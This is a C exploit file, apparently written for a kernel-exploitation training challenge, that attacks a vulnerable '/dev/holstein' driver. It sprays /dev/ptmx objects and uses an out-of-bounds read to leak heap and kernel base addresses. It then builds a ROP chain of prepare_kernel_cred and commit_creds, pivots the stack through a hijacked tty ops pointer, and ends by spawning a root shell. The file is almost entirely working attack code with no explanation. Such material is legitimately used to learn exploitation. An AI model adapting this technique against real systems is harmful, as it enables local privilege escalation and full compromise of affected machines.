#include <stdio.h>
#include <ctype.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>

/*
0xffffffff810d748d: pop rdi; ret; 
0xffffffff81022dff: iretq; pop rbp; ret;
0xffffffff8162668e: swapgs; ret;
0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;
0xffffffff8162707b: mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret;
0xffffffff8109c39e: pop rsi; ret;
0xffffffff8113c1c4: pop rcx; ret;
0xffffffff81800e10 T swapgs_restore_regs_and_return_to_usermode
*/

#define prepare_kernel_cred_offset 0x74650
#define commit_creds_offset 0x744b0
#define pop_rdi_offset 0xd748d
#define iretq_pop_rbp_offset 0x22dff
#define push_rax_ret_offset 0x24819 
#define push_rdx_pop_rsp_ret_offset 0x3a478a
#define mov_rdi_rax_ret_offset 0x62707b
#define swapgs 0x62668e
#define pop_rsi 0x9c39e
#define pop_rcx 0x13c1c4
#define swapgs_restore_regs_and_return_to_usermode 0x800e10

unsigned long kernel_base;
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long user_cs, user_sp, user_ss, user_rflags;

void save_user_land()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_sp, rsp;"
		"mov user_ss, ss;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("[*] Saved userland registers");
	printf("[#] cs: 0x%lx \n", user_cs);
	printf("[#] ss: 0x%lx \n", user_ss);
	printf("[#] rsp: 0x%lx \n", user_sp);
	printf("[#] rflags: 0x%lx \n\n", user_rflags);
}


void backdoor()
{
	printf("****getshell****");
	system("id");
	system("/bin/sh");
}


int main() {
    save_user_land();
    int spray[100];
    for (int i = 0; i < 50; i++)
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    int fd = open("/dev/holstein", O_RDWR);
    for (int i = 50; i < 100; i++)
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    char buf[0x500];
    read(fd, buf, 0x500);
    unsigned long * p = (unsigned long *)&buf;
    //for (int i = 0; i < 0xa0; i++)
    //	printf("[0x%x] 0x%lx\n",i ,p[i]);
    unsigned long heap = p[0x9f];
    printf("heap:0x%lx\n", heap);
    unsigned long g_buf = heap - 0x4f8 ;
    printf("g_buf:0x%lx\n", g_buf);
    unsigned long kernel_addr = p[0x83];
    printf("kernel_addr:0x%lx\n", kernel_addr);
    kernel_base = kernel_addr - 0xc38880;
    printf("kernel_base:0x%lx\n", kernel_base);
    p[0x22] = pop_rdi_offset + kernel_base;
    p[0x23] = 0;
    p[0x24] = prepare_kernel_cred_offset + kernel_base;
    p[0x25] = pop_rcx + kernel_base;
    p[0x26] = 0;
    p[0x27] = mov_rdi_rax_ret_offset + kernel_base;
    p[0x28] = commit_creds_offset + kernel_base;
    p[0x29] = swapgs_restore_regs_and_return_to_usermode + kernel_base + 0x16;
    p[0x2a] = 0;
    p[0x2b] = 0;
    p[0x2c] = (unsigned long)backdoor;
    p[0x2d] = user_cs;
    p[0x2e] = user_rflags;
    p[0x2f] = user_sp;
    p[0x30] = user_ss;    
    *(unsigned long *)&buf[0x418] = g_buf;
    p[0xc] = p[0xc] = kernel_base + push_rdx_pop_rsp_ret_offset;
    write(fd, buf, 0x500);
    for (int i = 0; i < 100; i++) {
       ioctl(spray[i], g_buf+0x100, g_buf+0x100);
    }       
}
